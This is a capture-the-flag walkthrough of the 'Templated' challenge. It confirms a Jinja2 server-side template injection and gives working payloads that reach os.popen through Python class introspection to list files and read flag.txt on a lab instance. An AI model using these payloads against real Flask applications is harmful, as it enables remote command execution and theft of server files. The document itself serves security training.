### Starting
For the **Templated** challenge, start an instance and visit the IP displayed.
The description **Can you exploit this simple mistake?** suggests that there is a simple mistake to be exploited.

On visiting the IP, we are greeted with the following page
![[Screenshot 1.png]]
The page displays that it is proudly powered by **Flask/Jinja2**
On inspecting the source code and the requests, there is nothing useful that is found.
The title **Templated** and **Flask/Jinja2** both hint towards Server Side Template Injection (SSTI).

So lets try template injection via the URL. Using `{{7 * '7'}}` as a payload the URL became http://142.93.35.92:31572/{{7*'7'}}
On visiting this URL, we are greeted with the following page.
![[Screenshot 2.png]]
We can see that the payload has been evaluted as '7777777'. This confirms that a template injection vulnerability exists in the site.
A good article on [SSTI with Jinja2](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti) can be found here.
And [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) also has lots of payloads for various languages and the templating engines used in them including Jinja.

So we can use **MRO** function to display classes which will useful in creating the specific payload for the website.
Payload to list files in the current directory
`{{ "".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('ls%20*').read()}}`
The URL will look like
`http://142.93.35.92:31572/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('ls%20*').read()}}`
![[Screenshot 3.png]]
We can see that flag.txt exists in the current folder.
So we will replace `ls *` with `cat flag.txt` in the payload.
Payload to print flag
`{{ "".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('cat%20flag.txt').read()}}`
The URL will look like
`http://142.93.35.92:31572/%7B%7B''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('cat%20flag.txt').read()%7D%7D`
And with this we will have the flag printed on the screen.
